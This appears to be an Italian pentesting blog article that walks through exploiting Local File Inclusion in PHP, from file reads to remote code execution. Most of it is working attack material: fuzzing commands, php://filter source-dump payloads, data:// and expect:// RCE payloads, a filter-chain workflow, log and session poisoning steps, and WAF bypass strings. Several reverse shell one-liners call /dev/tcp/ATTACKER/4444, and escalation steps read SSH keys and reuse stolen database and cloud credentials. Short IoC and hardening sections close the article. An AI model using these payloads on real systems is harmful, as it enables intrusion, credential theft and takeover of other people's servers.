---
title: 'LFI (Local File Inclusion): Da File Read a Remote Code Execution'
slug: lfi
description: 'Scopri come sfruttare una LFI (Local File Inclusion) nel pentesting web. LFI to Rce. Lettura di file sensibili, dump del source code con php://filter e RCE tramite PHP filter chain e log poisoning. '
image: /lfi-Local-FIle-Inclusion.webp
draft: true
date: 2026-03-15T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - lfi
---

Il [Path Traversal](https://hackita.it/articoli/path-traversal) legge i file. La **LFI** li legge E li **esegue**. È la differenza tra spiare dalla finestra e avere le chiavi di casa. In PHP, `include()` e `require()` non si limitano a leggere un file — lo **interpretano come codice PHP**. Se l'attaccante controlla quale file viene incluso, e quel file contiene codice (iniettato dall'attaccante o già presente), il risultato è **Remote Code Execution**.

La LFI è la vulnerabilità che preferisco nei pentest perché ha **molteplici percorsi verso la RCE**: PHP wrappers nativi (`filter`, `input`, `data`, `expect`), la tecnica **PHP filter chain** del 2024 che dà RCE pura senza prerequisiti, il [log poisoning](https://hackita.it/articoli/log-injection) tramite User-Agent, il session poisoning, `/proc/self/environ`. Anche quando la LFI sembra "solo" un file read, quasi sempre trovo un modo per escalare a esecuzione di codice.

La trovo nel **12% dei pentest web**, principalmente su applicazioni PHP. Delle LFI che trovo, riesco a escalare a RCE nel **70% dei casi** — una percentuale che è salita drasticamente dal 2023 grazie alla tecnica PHP filter chain.

Satellite operativo della [guida pillar File & Path Attacks](https://hackita.it/articoli/file-path-attacks-guida-completa).

## Cos'è la LFI?

La Local File Inclusion è una vulnerabilità in cui l'applicazione **include un file locale** basandosi su input dell'utente, e il contenuto viene **interpretato come codice** dal linguaggio server-side. In PHP, `include()`, `require()`, `include_once()` e `require_once()` valutano il codice PHP contenuto nel file incluso. L'attaccante sfrutta questa meccanica per leggere source code, estrarre credenziali, e ottenere RCE attraverso wrappers PHP o tecniche di poisoning.

> **La LFI è pericolosa?**
> Sì — da sola permette di **leggere qualsiasi file** del server (credenziali, source code, chiavi SSH). Con i PHP wrappers porta a **RCE senza upload e senza log poisoning** — la tecnica PHP filter chain (2024+) funziona su qualsiasi LFI PHP ≥ 7.0, senza alcun prerequisito. Con log/session poisoning porta a RCE anche senza wrappers. Trovata nel **12% dei pentest web**, escalabile a RCE nel **70% dei casi**.

## Come Verificare — Discovery

```bash
# Shodan — errori di include esposti
"include(): Failed opening" port:80,443
"require(): Failed opening" port:80,443
"Warning: include(" port:80,443
"No such file or directory" "include" port:80,443

# Google Dorks
site:target.com inurl:"page=" OR inurl:"file=" OR inurl:"include=" OR inurl:"lang="
site:target.com "Warning: include(" OR "failed to open stream"
site:target.com ext:php inurl:"template=" OR inurl:"module=" OR inurl:"view="

# Nuclei
nuclei -u https://target.com -tags lfi
nuclei -u https://target.com -t vulnerabilities/generic/generic-lfi.yaml
```

***

## Fuzzing LFI con ffuf

Il fuzzing è il primo step: trova il parametro vulnerabile e il payload funzionante prima di passare al manuale.

### Fuzz il payload (sai il parametro)

```bash
# Wordlist Jhaddix — 900+ payload con encoding diversi
ffuf -u "https://target.com/page.php?file=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -mc 200 \
  -mr "root:x:" \
  -o lfi_results.json

# La wordlist contiene:
# ../../../etc/passwd
# ....//....//....//etc/passwd
# ..%2f..%2f..%2fetc/passwd
# ..%252f..%252f..%252fetc/passwd
# php://filter/convert.base64-encode/resource=../../../etc/passwd
# etc. (900+ varianti)
```

### Fuzz il parametro (non sai quale è vulnerabile)

```bash
# Testa TUTTI i parametri con un payload traversal
ffuf -u "https://target.com/index.php?FUZZ=../../../etc/passwd" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -mc 200 \
  -mr "root:x:"

# Stessa cosa con php://filter
ffuf -u "https://target.com/index.php?FUZZ=php://filter/convert.base64-encode/resource=index.php" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -mc 200 \
  -fs 0
# Se un parametro risponde con una stringa base64 lunga → LFI confermata
```

### Fuzz i wrappers

```bash
# Wordlist specifica per PHP wrappers
cat > wrappers.txt << 'EOF'
php://filter/convert.base64-encode/resource=config
php://filter/convert.base64-encode/resource=index
php://filter/convert.base64-encode/resource=../config
php://filter/convert.base64-encode/resource=../../config
php://filter/read=string.rot13/resource=config
php://filter/convert.iconv.UTF-8.UTF-16/resource=config
php://input
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
expect://id
EOF

ffuf -u "https://target.com/page.php?file=FUZZ" \
  -w wrappers.txt \
  -mc 200 \
  -fs 0
```

### Fuzz su POST / JSON

```bash
# LFI su parametro POST
ffuf -u "https://target.com/page.php" \
  -X POST \
  -d "template=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -mc 200 \
  -mr "root:x:"

# LFI su JSON body (bypass WAF)
ffuf -u "https://target.com/api/render" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"template": "FUZZ"}' \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -mc 200 \
  -mr "root:x:"
```

***

## PHP Wrappers — Il Coltellino Svizzero della LFI

I PHP wrappers sono protocolli built-in che trasformano la LFI da "file read" a "strumento di exploitation completo". Ogni wrapper ha un uso specifico.

### php\://filter — Leggi Source Code in Chiaro

Il wrapper più utile per la fase di reconnaissance: legge un file PHP **senza eseguirlo**, restituendolo codificato. Senza `php://filter`, se includi `config.php` il PHP lo esegue e ti mostra solo l'output — con il filter ottieni il **codice sorgente con tutte le credenziali**.

```bash
# === BASE64 ENCODE — il più affidabile ===
?file=php://filter/convert.base64-encode/resource=config
?file=php://filter/convert.base64-encode/resource=config.php
?file=php://filter/convert.base64-encode/resource=../config/database
?file=php://filter/convert.base64-encode/resource=../../.env
```

#### Output Reale — php\://filter

```bash
# Request:
GET /page.php?file=php://filter/convert.base64-encode/resource=config HTTP/1.1

# Response (raw base64):
PD9waHAKJGRiX2hvc3QgPSAnMTAuMC4xLjUwJzsKJGRiX3VzZXIgPSAnYWRtaW4nOwokZGJfcGFz
cyA9ICdTdXBlclNlY3JldDEyMyEnOwokZGJfbmFtZSA9ICdteWFwcF9wcm9kJzsKJHNlY3JldF9r
ZXkgPSAnZmxhc2staW5zZWN1cmUta2V5LW5vYm9keS1jaGFuZ2VkJzsKPz4=

# Decodifica:
echo "PD9waHAK..." | base64 -d
```

```php
<?php
$db_host = '10.0.1.50';
$db_user = 'admin';
$db_pass = 'SuperSecret123!';
$db_name = 'myapp_prod';
$secret_key = 'flask-insecure-key-nobody-changed';
?>
```

**Hai il codice sorgente con tutte le credenziali in chiaro.** Da qui: connessione diretta al database, forgiatura session cookie con la secret key, mappa dei file da leggere.

#### Varianti filter per bypass

```bash
# ROT13
?file=php://filter/read=string.rot13/resource=config.php

# Charset conversion (se "base64" è filtrato)
?file=php://filter/convert.iconv.UTF-8.UTF-16/resource=config.php
?file=php://filter/convert.iconv.UTF-8.UTF-16LE/resource=config.php
?file=php://filter/convert.iconv.UTF-8.UTF-7/resource=config.php

# Zlib compression
?file=php://filter/zlib.deflate/resource=config.php
# → decomprimi con: php -r "echo gzinflate(file_get_contents('php://stdin'));"

# Chain di filtri multipli
?file=php://filter/convert.base64-encode|convert.base64-encode/resource=config.php
# → doppio base64, decodifica due volte
```

### php\://input — RCE dal Body (se allow\_url\_include=On)

```bash
# Request:
POST /page.php?file=php://input HTTP/1.1
Host: target.com
Content-Type: text/plain
Content-Length: 29

<?php system('id'); ?>
```

#### Output Reale — php\://input

```
HTTP/1.1 200 OK
Content-Type: text/html

<html>
<body>
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</body>
</html>
```

```bash
# Con curl:
curl -s "https://target.com/page.php?file=php://input" \
  -d "<?php system('id'); ?>"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Reverse shell:
curl -s "https://target.com/page.php?file=php://input" \
  -d "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\"'); ?>"
```

### data:// — RCE Inline

```bash
# Base64 (più affidabile)
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
# Payload decodificato: <?php system('id'); ?>

# Plain text
?file=data://text/plain,<?php system('id'); ?>
?file=data://text/plain,<?php+system('id');+?>

# Reverse shell in base64
?file=data://text/plain;base64,PD9waHAgZXhlYygiL2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwL0FUVEFDS0VSLzQ0NDQgMD4mMSciKTsgPz4=
```

### expect:// — Comandi Diretti (se estensione presente)

```bash
?file=expect://id
?file=expect://whoami
?file=expect://cat+/etc/passwd
?file=expect://bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261'
```

***

## PHP Filter Chain — RCE Avanzata 2024+ (Il Game Changer)

La **PHP filter chain** è la tecnica che ha cambiato tutto per la LFI. Scoperta nel 2022-2023 e raffinata nel 2024, permette di ottenere **RCE pura dalla sola LFI** — senza log poisoning, senza upload, senza `allow_url_include`, senza nessun prerequisito. Funziona su **qualsiasi LFI PHP ≥ 7.0**.

### Come funziona

I filtri `convert.iconv` di PHP convertono tra set di caratteri. Concatenando decine di conversioni iconv in sequenza, è possibile **"costruire" byte arbitrari** a partire dal contenuto di qualsiasi file locale (anche `php://temp` che è vuoto). Il risultato è una stringa di filtri lunghissima che, quando PHP la risolve, produce esattamente il codice PHP desiderato — e `include()` lo esegue.

### Generazione del payload

```bash
# Clona il tool
git clone https://github.com/synacktiv/php_filter_chain_generator
cd php_filter_chain_generator

# Genera la chain per eseguire 'id'
python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>'

# Output (troncato — la chain reale è lunga centinaia di caratteri):
# php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|
# convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|
# convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|
# ...[decine di altri filtri]...|
# convert.base64-decode/resource=php://temp
```

### Uso operativo

```bash
# Genera il payload
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>' > chain.txt

# Estrai il payload (è tutto su una riga)
CHAIN=$(cat chain.txt)

# Usa nel parametro LFI
curl -s "https://target.com/page.php?file=$CHAIN&c=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Reverse shell
curl -s "https://target.com/page.php?file=$CHAIN&c=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261'"
```

### Perché è un game changer

* **Non serve upload** — nessun file da caricare
* **Non serve log poisoning** — nessun log da trovare e iniettare
* **Non serve `allow_url_include`** — funziona con la configurazione di default
* **Non serve `allow_url_fopen`** — usa solo `php://temp` (locale)
* **Funziona su PHP ≥ 7.0** — cioè il 95%+ dei server PHP nel 2026
* **L'unico requisito è una LFI funzionante** — se puoi includere un file, hai RCE

### Limiti

* La chain è **molto lunga** (migliaia di caratteri) — può superare il limite di lunghezza URL su alcuni server
* Su URL GET: prova POST se la chain è troppo lunga
* Alcuni WAF bloccano le chain per la lunghezza anomala del parametro

***

## LFI → RCE via Log Poisoning — Step by Step Con Proof

Quando i wrappers non funzionano (PHP vecchio, configurazione restrittiva), il **log poisoning** è il percorso alternativo: inietti PHP in un file di log, poi includi quel log via LFI.

### Step 1: Trova un log leggibile

```bash
# Testa i path dei log più comuni
?file=../../../var/log/apache2/access.log
?file=../../../var/log/apache2/error.log
?file=../../../var/log/nginx/access.log
?file=../../../var/log/nginx/error.log
?file=../../../var/log/httpd/access_log          # CentOS/RHEL
?file=../../../var/log/httpd/error_log
?file=../../../opt/lampp/logs/access_log          # XAMPP
?file=../../../var/log/auth.log                   # SSH attempts
?file=../../../var/log/mail.log                   # SMTP
?file=../../../var/log/vsftpd.log                 # FTP

# Se vedi righe di log nella risposta → il file è leggibile → Step 2
```

#### Output Reale — Log leggibile

```
# Request:
GET /page.php?file=../../../var/log/apache2/access.log HTTP/1.1

# Response:
192.168.1.100 - - [19/Feb/2026:10:00:00 +0000] "GET / HTTP/1.1" 200 5432 "-" "Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0"
192.168.1.100 - - [19/Feb/2026:10:00:01 +0000] "GET /style.css HTTP/1.1" 200 1234 "-" "Mozilla/5.0..."
10.0.0.5 - - [19/Feb/2026:10:00:02 +0000] "GET /api/health HTTP/1.1" 200 2 "-" "HealthCheck/1.0"
```

Vedo il log → il campo User-Agent è visibile → lo uso come vettore di injection.

### Step 2: Inietta PHP nell'User-Agent

```bash
curl http://target.com/ -H "User-Agent: <?php system(\$_GET['c']); ?>"

# Il log ora contiene:
# 192.168.1.100 - - [...] "GET / HTTP/1.1" 200 5432 "-" "<?php system($_GET['c']); ?>"
```

### Step 3: Includi il log con il comando

```bash
curl -s "http://target.com/page.php?file=../../../var/log/apache2/access.log&c=id"
```

#### Output Reale — RCE via Log Poisoning

```
192.168.1.100 - - [...] "GET / HTTP/1.1" 200 5432 "-" "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
10.0.0.5 - - [...] "GET /api/health HTTP/1.1" 200 2 "-" "HealthCheck/1.0"
192.168.1.100 - - [...] "GET /page.php?file=... HTTP/1.1" 200 ...
```

Il `<?php system($_GET['c']); ?>` è stato eseguito e l'output `uid=33(www-data)` appare al posto dell'User-Agent nel log.

### Step 4: Reverse shell

```bash
curl -s "http://target.com/page.php?file=../../../var/log/apache2/access.log&c=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261'"
```

***

## LFI → RCE via Session Poisoning

Se i log non sono leggibili, le sessioni PHP sono il piano B:

```bash
# === STEP 1: Trova dove PHP salva le sessioni ===
# Default: /tmp/sess_PHPSESSID o /var/lib/php/sessions/sess_PHPSESSID
# Leggi phpinfo() se accessibile per il path esatto

# === STEP 2: Inietta PHP nella sessione ===
# Trova una pagina che salva input in $_SESSION:
# Esempio: pagina lingua
curl -s "http://target.com/settings.php?lang=<?php+system(\$_GET['c']);+?>" \
  -b "PHPSESSID=test123"

# O: campo username/preferenze che va in sessione
curl -s "http://target.com/profile.php" \
  -d "nickname=<?php system(\$_GET['c']); ?>" \
  -b "PHPSESSID=test123"

# === STEP 3: Includi il file di sessione ===
curl -s "http://target.com/page.php?file=../../../tmp/sess_test123&c=id" \
  -b "PHPSESSID=test123"
# uid=33(www-data) gid=33(www-data)
```

***

## LFI → RCE via /proc/self/environ

Il file `/proc/self/environ` contiene le variabili d'ambiente del processo corrente, **incluso HTTP\_USER\_AGENT**:

```bash
# Step 1: Verifica che /proc/self/environ sia leggibile
?file=../../../proc/self/environ
# Se vedi variabili d'ambiente → Step 2

# Step 2: Inietta PHP nell'User-Agent e includi /proc/self/environ
curl -s "http://target.com/page.php?file=../../../proc/self/environ" \
  -H "User-Agent: <?php system('id'); ?>"
# Il PHP nell'User-Agent viene scritto in HTTP_USER_AGENT nell'environ
# include() lo esegue → uid=33(www-data)
```

***

## WAF Bypass LFI

### Bypass sul protocollo php\://

```bash
# Case mixing (il WAF cerca "php://" lowercase)
?file=Php://filter/convert.base64-encode/resource=config.php
?file=PHP://filter/convert.base64-encode/resource=config.php
?file=pHp://filter/convert.base64-encode/resource=config.php
?file=PhP://filter/convert.base64-encode/resource=config.php

# URL encoding di "php://"
?file=%70%68%70://filter/convert.base64-encode/resource=config.php
# %70=p %68=h %70=p

# Double encoding
?file=%2570%2568%2570://filter/convert.base64-encode/resource=config.php
```

### Bypass sul filtro "base64"

```bash
# Se il WAF blocca "base64":
?file=php://filter/convert.iconv.UTF-8.UTF-16/resource=config.php
?file=php://filter/convert.iconv.UTF-8.UTF-16LE/resource=config.php
?file=php://filter/convert.iconv.UTF-8.UTF-7/resource=config.php
?file=php://filter/zlib.deflate/resource=config.php
?file=php://filter/read=string.rot13/resource=config.php

# Chain di filtri per offuscare
?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode/resource=config.php
```

### Bypass sul path traversal

```bash
# Double encoding
?file=..%252f..%252f..%252fetc/passwd

# UTF-8 overlong
?file=..%c0%af..%c0%afetc/passwd

# Bypass strip non ricorsivo
?file=....//....//....//etc/passwd

# Null byte (PHP < 5.3.4)
?file=../../../etc/passwd%00
?file=../../../etc/passwd%00.php

# Path truncation (PHP < 5.3 — crea path > 4096 chars)
?file=../../../etc/passwd/./././././././././[...ripeti fino a 4096 chars]

# Tomcat semicolon trick (se reverse proxy Tomcat)
?file=..;/..;/..;/etc/passwd

# JSON body (WAF spesso non controlla)
POST /page.php
Content-Type: application/json
{"file": "../../../etc/passwd"}
```

### Bypass sul filtro "data://"

```bash
# Case mixing
?file=Data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
?file=DATA://text/plain;base64,...

# Encode
?file=%64%61%74%61://text/plain;base64,...
```

***

## Workflow Reale — Dal Parametro Alla Shell

### Step 1 → Trova il parametro

```bash
ffuf -u "https://target.com/index.php?FUZZ=../../../etc/passwd" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -mc 200 -mr "root:x:"
# Parametri tipici: page, file, include, template, lang, view, module, load
```

### Step 2 → Conferma traversal

```bash
?file=../../../etc/passwd
# Bloccato → ....//....//....// → ..%2f → ..%252f → ..%c0%af
# Se ottieni root:x:0:0 → confermata
```

### Step 3 → Dump source code con php\://filter

```bash
?file=php://filter/convert.base64-encode/resource=config
?file=php://filter/convert.base64-encode/resource=index
?file=php://filter/convert.base64-encode/resource=../config/database
?file=php://filter/convert.base64-encode/resource=../../.env

# Decodifica ogni output → cerca credenziali: password, secret, key, token
echo "BASE64_OUTPUT" | base64 -d
```

### Step 4 → Tenta RCE diretta

```bash
# A. PHP filter chain (il metodo migliore — funziona quasi sempre)
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
# → usa il payload come valore del parametro file

# B. php://input (se allow_url_include=On)
curl "https://target.com/page.php?file=php://input" -d "<?php system('id'); ?>"

# C. data:// (se allow_url_include=On)
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# D. expect:// (se estensione presente)
?file=expect://id
```

### Step 5 → Se wrappers non funzionano, log poisoning

```bash
# Trova un log leggibile
?file=../../../var/log/apache2/access.log

# Inietta PHP nell'User-Agent
curl http://target.com/ -H "User-Agent: <?php system(\$_GET['c']); ?>"

# Includi il log
?file=../../../var/log/apache2/access.log&c=id
```

### Step 6 → Escalation

```bash
# Da RCE → credenziali
cat /app/.env
cat /proc/self/environ
cat /home/deploy/.ssh/id_rsa

# Da credenziali → database, cloud, SSH
mysql -h 10.0.1.50 -u admin -p'SuperSecret123!'
aws sts get-caller-identity
ssh -i stolen_key deploy@target.com
```

***

## 🏢 Enterprise Escalation

### LFI → Source Code → Credenziali → Data Breach

```
php://filter → config.php → DB_PASSWORD
→ mysql dump → 200K utenti con PII
→ O: SECRET_KEY → forgia session admin → admin panel
```

### LFI → RCE → Cloud Compromise

```
PHP filter chain → RCE www-data
→ /proc/self/environ → AWS_ACCESS_KEY_ID
→ aws s3 ls → bucket backup
→ aws secretsmanager → credenziali interne
→ CLOUD TAKEOVER
```

### LFI → RCE → Domain Admin

```
Log poisoning → RCE → shell www-data
→ config files → LDAP credentials
→ ldapsearch → enumera AD → password in description
→ Domain Admin → DCSync
```

## 🔌 Variante API / Microservizi 2026

```json
// Template rendering
POST /api/v2/reports/generate
{"template": "php://filter/convert.base64-encode/resource=../config/database"}

// PDF generation con template LFI
POST /api/v2/pdf/create
{"template_file": "../../../etc/passwd"}

// Include dinamico (internazionalizzazione)
GET /api/v2/content?lang=../../../etc/passwd%00
```

***

## Micro Playbook Reale

**Minuto 0-3 →** ffuf con LFI-Jhaddix.txt per trovare parametro e payload
**Minuto 3-8 →** php\://filter → dump config.php, database.yml, .env
**Minuto 8-12 →** Decodifica base64 → estrai credenziali
**Minuto 12-18 →** PHP filter chain → RCE diretta
**Minuto 18-20 →** Se chain bloccata: log poisoning → RCE
**Minuto 20-25 →** Reverse shell → post-exploitation

**Da LFI a shell in 25 minuti.**

## Caso Studio Concreto

**Settore:** CMS aziendale PHP, 500 dipendenti, portale intranet.
**Scope:** Grey-box.

Parametro `?lang=en` che includeva `languages/en.php`. ffuf con LFI-Jhaddix → `?lang=php://filter/convert.base64-encode/resource=../config` → base64 decodificato → credenziali MySQL (`root:Company2024!`), LDAP bind password, SMTP credentials, e `APP_SECRET_KEY`.

PHP filter chain per RCE: `python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'` → payload nel parametro `lang` → `uid=33(www-data)`.

Con la `APP_SECRET_KEY` ho forgiato un session cookie admin → accesso al pannello di amministrazione → gestione di tutti i 500 utenti. Con le credenziali LDAP → `ldapsearch` sull'Active Directory → 3 service account con password nel campo description → uno era Domain Admin.

**Tempo dalla LFI al dump source code:** 5 minuti.
**Tempo dalla LFI alla RCE:** 12 minuti.
**Tempo dalla LFI al Domain Admin:** 2 ore.

***

## Errori Comuni Reali

**1. `include($_GET['page'])` senza whitelist (il pattern killer)**
Lo sviluppatore vuole pagine dinamiche e prende la scorciatoia fatale.

**2. `include($_GET['page'] . '.php')` — falsa sicurezza**
Appende `.php` pensando di limitare a file locali. Bypass: null byte (`%00`), `php://filter`, PHP filter chain.

**3. `include("templates/" . $_GET['lang'] . ".php")` — filtro insufficiente**
Prefisso e suffisso non bloccano il path traversal: `?lang=../../etc/passwd%00`.

**4. Log con permessi troppo ampi**
I log di Apache/Nginx leggibili da `www-data` → vettore di log poisoning.

**5. Sessioni in /tmp senza restrizioni**
I file di sessione PHP in `/tmp/` leggibili e includibili → session poisoning.

***

## Indicatori di Compromissione (IoC)

* `php://filter`, `php://input`, `data://`, `expect://` nei parametri URL nei log
* Chain di `convert.iconv` lunghe centinaia di caratteri nei parametri (PHP filter chain)
* `../`, `..%2f`, `%252e` nei parametri che referenziano file
* User-Agent contenente `<?php`, `system(`, `exec(`, `base64_decode` nei log
* Request verso file di log (`access.log`, `error.log`) nei parametri URL
* Processi `bash`/`sh` figli del processo PHP dopo request con wrapper nel parametro

***

## ✅ Checklist Finale — LFI Testing

```
DISCOVERY
☐ ffuf con LFI-Jhaddix.txt per trovare parametro e payload
☐ Testato sia GET che POST/JSON
☐ Identificato il framework (PHP version, config)

PHP WRAPPERS
☐ php://filter/convert.base64-encode/resource=config
☐ php://filter con iconv (bypass filtro "base64")
☐ php://filter con rot13
☐ php://filter con zlib.deflate
☐ php://input + POST body (se allow_url_include=On)
☐ data://text/plain;base64,... (se allow_url_include=On)
☐ expect://id (se estensione presente)

PHP FILTER CHAIN (RCE 2024+)
☐ php_filter_chain_generator.py → payload generato
☐ Testato via GET
☐ Testato via POST (se URL troppo lungo)

LOG POISONING
☐ access.log leggibile?
☐ error.log leggibile?
☐ auth.log leggibile?
☐ PHP iniettato nell'User-Agent
☐ Log incluso con parametro comando → RCE

SESSION POISONING
☐ Sessioni in /tmp/ o /var/lib/php/sessions/
☐ Input salvato in $_SESSION trovato
☐ PHP iniettato nella sessione → incluso → RCE

/proc/self/environ
☐ File leggibile?
☐ User-Agent con PHP → /proc/self/environ incluso → RCE

WAF BYPASS
☐ Case mixing (Php://, PHP://)
☐ URL encoding (%70%68%70://)
☐ Filtro alternativo (iconv, rot13, zlib)
☐ Double encoding path traversal
☐ JSON body (bypass WAF)

ESCALATION
☐ Source code estratto → credenziali trovate
☐ Credenziali DB → dump database
☐ Credenziali cloud → aws/az/gcloud
☐ SECRET_KEY → session cookie forgiato
☐ SSH key trovata → accesso diretto
```

***

## Detection & Hardening

* **Whitelist** — non accettare path liberi: `['en' => 'languages/en.php', 'it' => 'languages/it.php']`
* **`allow_url_include = Off`** — verifica in php.ini (default Off)
* **`open_basedir`** — limita i file accessibili da PHP alla document root
* **Permessi file log** — non leggibili da `www-data`
* **Sessioni protette** — `session.save_path` non in `/tmp/`, permessi restrittivi
* **WAF** — blocca `php://`, `data://`, `expect://`, `convert.iconv` nei parametri

```php
// ❌ VULNERABILE
include($_GET['page']);
include($_GET['page'] . '.php');
include("templates/" . $_GET['lang'] . ".php");

// ✅ SICURO — whitelist
$allowed = ['en' => 'lang/en.php', 'it' => 'lang/it.php', 'de' => 'lang/de.php'];
$lang = $_GET['lang'] ?? 'en';
if (isset($allowed[$lang])) {
    include($allowed[$lang]);
} else {
    include('lang/en.php');
}
```

***

Satellite della [Guida Completa File & Path Attacks](https://hackita.it/articoli/file-path-attacks-guida-completa). Vedi anche: [Path Traversal](https://hackita.it/articoli/path-traversal), [RFI](https://hackita.it/articoli/rfi), [Log Injection](https://hackita.it/articoli/log-injection), [Arbitrary File Read](https://hackita.it/articoli/arbitrary-file-read).

> I tuoi `include()` accettano input utente? [Penetration test applicativo HackIta](https://hackita.it/servizi) per trovare ogni LFI — dalla lettura source code alla RCE via filter chain. Per padroneggiare l'exploitation dalla LFI al Domain Admin: [formazione 1:1](https://hackita.it/formazione).
